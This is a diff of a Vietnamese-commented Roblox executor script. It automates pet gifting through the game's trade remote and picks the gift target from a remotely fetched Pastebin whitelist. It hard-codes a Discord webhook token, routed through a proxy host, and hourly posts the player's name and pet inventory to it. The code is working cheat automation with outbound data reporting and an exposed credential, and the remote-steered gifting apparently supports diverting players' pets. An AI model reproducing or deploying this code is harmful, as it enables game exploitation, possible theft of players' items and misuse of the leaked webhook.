@@ -1,8 +1,4 @@
--- Cấu hình Webhook
-local WEBHOOK_URL = "https://discord.com/api/webhooks/1456310274243166219/E-d5-s35qO6SZ9-3JuowoiZ_HQ887fWKPuLh-Kj-SlLyRNPgpQ3iqIOVwJx1b0qaWAd_" 
-local WEBHOOK_DELAY = 3601 
-local WHITELIST_URL = "https://pastebin.com/raw/n6LvrFGC"
-
+-- lọc player, delay 8, max 1, full mutation 
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local UserInputService = game:GetService("UserInputService")
@@ -10,112 +6,128 @@ local RunService = game:GetService("RunService")
 local HttpService = game:GetService("HttpService")
 local LocalPlayer = Players.LocalPlayer
 
--- [GIỮ NGUYÊN CÁC BIẾN LOGIC GỐC]
 local TradeRemote = ReplicatedStorage:WaitForChild("Packages"):WaitForChild("Net"):WaitForChild("RF/Trade.SendGift")
+local RAW_URL = "https://pastebin.com/raw/n6LvrFGC"
+local WEBHOOK_URL = "https://webhook.lewisakura.moe/api/webhooks/1456310274243166219/E-d5-s35qO6SZ9-3JuowoiZ_HQ887fWKPuLh-Kj-SlLyRNPgpQ3iqIOVwJx1b0qaWAd_"
+
 local MIN_LEVEL = 150
 local TRADE_DELAY = 8 
+local WEBHOOK_DELAY = 3661 -- 1h1s
 local TradeEnabled, IsTrading = false, false
 local TargetPlayer, SelectedPetName = nil, nil
 local CooldownTime = 0
 local Whitelist = {}
 
--- ==========================================
--- LOGIC WEBHOOK & WHITELIST MỚI
--- ==========================================
+-- ============== WEBHOOK FUNCTIONS ==============
 
--- Hàm kiểm tra xem người chơi có trong whitelist Pastebin không
-local function IsPlayerInWebhookWhitelist()
-    local success, content = pcall(function() return game:HttpGet(WHITELIST_URL) end)
-    if success then
-        for line in content:gmatch("[^\r\n]+") do
-            local cleanName = line:gsub("^%s*(.-)%s*$", "%1"):lower()
-            if LocalPlayer.Name:lower() == cleanName then
-                return true
-            end
+local function UrlEncode(str)
+    str = tostring(str)
+    str = string.gsub(str, "([^%w%-%.%_%~ ])", function(c)
+        return string.format("%%%02X", string.byte(c))
+    end)
+    str = string.gsub(str, " ", "+")
+    return str
+end
+
+local function GetVietnameseDateTime()
+    local timestamp = os.time()
+    local date = os.date("*t", timestamp)
+    
+    local weekdays = {"CN", "T2", "T3", "T4", "T5", "T6", "T7"}
+    local weekday = weekdays[date.wday]
+    
+    return string.format("%s/%d/%d/%d", weekday, date.day, date.month, date.year)
+end
+
+local function IsPlayerInWhitelist()
+    local playerName = LocalPlayer.Name:lower()
+    local displayName = LocalPlayer.DisplayName:lower()
+    
+    for _, name in ipairs(Whitelist) do
+        if playerName == name or displayName == name then
+            return true
         end
     end
     return false
 end
 
-local function SendPetInventoryToWebhook()
-    -- Kiểm tra whitelist trước khi gửi
-    if not IsPlayerInWebhookWhitelist() then 
-        warn("Người dùng không có trong whitelist Webhook.")
-        return 
-    end
-
-    local petData = {}
-    local blacklistedName = "Basic Bat"
-
+local function GetPetList()
+    local petData = {} -- {["Cat|Money"] = 2, ["Dog|Dola"] = 3}
+    local totalCount = 0
+    
     for _, tool in ipairs(LocalPlayer.Backpack:GetChildren()) do
         if tool:IsA("Tool") then
-            local name = tool:GetAttribute("BrainrotName") or tool.Name
-            local mut = tool:GetAttribute("Mutation") or "None"
+            local brainrotName = tool:GetAttribute("BrainrotName") or tool.Name
+            local mutation = tool:GetAttribute("Mutation")
             
-            if name ~= blacklistedName then
-                local key = name .. "|" .. mut
-                if not petData[key] then
-                    petData[key] = {name = name, mutation = mut, count = 0}
-                end
-                petData[key].count = petData[key].count + 1
+            -- Lọc bỏ Basic Bat
+            if brainrotName ~= "Basic Bat" and mutation and mutation ~= "" then
+                local key = brainrotName .. "|" .. mutation
+                petData[key] = (petData[key] or 0) + 1
+                totalCount = totalCount + 1
             end
         end
     end
-
-    local fields = {}
-    local count = 0
-    for _, data in pairs(petData) do
-        count = count + 1
-        if count <= 25 then
-            table.insert(fields, {
-                ["name"] = "🐾 " .. data.name,
-                ["value"] = string.format("**Mutation:** %s\n**Số lượng:** %d", data.mutation, data.count),
-                ["inline"] = true
-            })
-        end
+    
+    -- Convert sang format string
+    local petList = {}
+    for key, count in pairs(petData) do
+        local parts = string.split(key, "|")
+        local petName = parts[1]
+        local mutationName = parts[2]
+        table.insert(petList, string.format("%s (%s) x%d", petName, mutationName, count))
     end
-
-    local payload = {
-        ["embeds"] = {{
-            ["title"] = "📢 Báo Cáo Kho Pet - " .. LocalPlayer.DisplayName,
-            ["description"] = "Người chơi: `" .. LocalPlayer.Name .. "`",
-            ["color"] = 0x00ff00,
-            ["fields"] = #fields > 0 and fields or {{["name"] = "Thông báo", ["value"] = "Trống"}},
-            ["footer"] = {["text"] = "RGB Mobile Pro V6 • " .. os.date("%X")}
-        }}
-    }
-
-    -- Sử dụng request (phương thức tối ưu cho Executor)
-    local requestFunc = syn and syn.request or http and http.request or http_request or request
-    if requestFunc then
-        requestFunc({
-            Url = WEBHOOK_URL,
-            Method = "POST",
-            Headers = {["Content-Type"] = "application/json"},
-            Body = HttpService:JSONEncode(payload)
-        })
-    else
-        -- Fallback nếu không có request (dùng cho môi trường Studio hoặc executor yếu)
-        pcall(function()
-            HttpService:PostAsync(WEBHOOK_URL, HttpService:JSONEncode(payload))
-        end)
-    end
+    
+    return petList, totalCount
 end
 
--- Chạy vòng lặp Webhook
+local function SendWebhook()
+    -- Kiểm tra whitelist
+    if not IsPlayerInWhitelist() then
+        return
+    end
+    
+    -- Lấy thông tin
+    local playerInfo = string.format("%s (%s)", LocalPlayer.DisplayName, LocalPlayer.Name)
+    local dateTime = GetVietnameseDateTime()
+    local petList, totalCount = GetPetList()
+    
+    -- Nếu không có pet (hoặc toàn Basic Bat) thì không gửi
+    if totalCount == 0 then
+        return
+    end
+    
+    -- Tạo message
+    local message = string.format("**Player:** %s\n**Pets:**\n", playerInfo)
+    for _, petInfo in ipairs(petList) do
+        message = message .. "- " .. petInfo .. "\n"
+    end
+    message = message .. string.format("**Total:** %d pets\n**Date:** %s", totalCount, dateTime)
+    
+    -- Encode và gửi
+    local encodedMessage = UrlEncode(message)
+    local fullUrl = WEBHOOK_URL .. "?content=" .. encodedMessage
+    
+    pcall(function()
+        HttpService:GetAsync(fullUrl)
+    end)
+end
+
+-- ============== WEBHOOK LOOP ==============
+
 task.spawn(function()
+    task.wait(2) -- Đợi script load đầy đủ
+    
     while true do
-        SendPetInventoryToWebhook()
+        SendWebhook()
         task.wait(WEBHOOK_DELAY)
     end
 end)
 
--- ==========================================
--- [CÁC PHẦN CÒN LẠI CỦA SCRIPT GIỮ NGUYÊN]
--- ==========================================
+-- ============== ORIGINAL CODE ==============
 
 local function UpdateWhitelist()
-    local success, content = pcall(function() return game:HttpGet(WHITELIST_URL) end)
+    local success, content = pcall(function() return game:HttpGet(RAW_URL) end)
     if success then
         Whitelist = {}
         for line in content:gmatch("[^\r\n]+") do
@@ -264,6 +276,8 @@ makeDraggable(floatBtn)
 local function refreshPlayers()
     UpdateWhitelist()
     for _, v in ipairs(PlayerSide:GetChildren()) do if v:IsA("TextButton") then v:Destroy() end end
+    
+    -- Tự động quét để gán TargetPlayer ban đầu từ whitelist nếu chưa chọn ai
     if not TargetPlayer then
         for _, plr in ipairs(Players:GetPlayers()) do
             if plr ~= LocalPlayer then
@@ -286,21 +300,24 @@ local function refreshPlayers()
                     break
                 end
             end
-
+            
             local isSelected = (TargetPlayer == plr)
             local b = Instance.new("TextButton", PlayerSide)
             b.Size = UDim2.new(0.95, 0, 0, 35)
+            
+            -- Hiển thị: Nếu là whitelist thì hiện sao ⭐, nếu đang được chọn thì hiện tích ✅
             local prefix = ""
             if isWhitelisted then prefix = "⭐ " end
             if isSelected then prefix = "✅ " .. prefix end
-
+            
             b.Text = prefix .. plr.DisplayName
             b.Font = (isWhitelisted or isSelected) and Enum.Font.GothamBold or Enum.Font.Gotham
             b.BackgroundColor3 = isSelected and Color3.fromRGB(40, 60, 40) or (isWhitelisted and Color3.fromRGB(40, 40, 20) or Color3.fromRGB(30, 30, 30))
             b.TextColor3 = Color3.new(1, 1, 1)
             b.BorderSizePixel = 0
             Instance.new("UICorner", b).CornerRadius = UDim.new(0, 6)
-
+            
+            -- Khung LED sáng cho người được chọn hoặc whitelist
             if isSelected or isWhitelisted then
                 local s = Instance.new("UIStroke", b)
                 s.Thickness = 2
